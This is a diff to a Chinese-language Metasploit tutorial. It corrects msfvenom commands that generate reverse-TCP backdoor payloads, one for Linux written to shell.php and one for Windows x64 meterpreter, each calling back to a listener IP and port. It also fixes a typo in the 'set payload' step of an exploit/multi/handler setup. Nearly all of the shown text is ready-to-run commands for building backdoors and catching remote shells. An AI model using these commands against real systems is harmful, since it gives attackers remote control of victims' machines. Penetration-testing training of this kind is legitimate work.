@@ -97,7 +97,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.204.149 lport=6688
 Linux可执行后门
 
 ```
-msfvenom -p linux/meterpreter/reverse_tcp lhost=192.168.137.129 lport=443 R>shell.php
+msfvenom -p linux/x64/reverse_tcp lhost=192.168.137.129 lport=443 R>shell.php
 ```
 
 > -p 设置攻击载荷
@@ -119,7 +119,7 @@ use exploit/multi/handler
 设置pyload
 
 ```
-set paypload windows/x64/meterpreter/reverse_tcp
+set payload windows/x64/meterpreter/reverse_tcp
 ```
 
 设置模块必选项 ip 端口
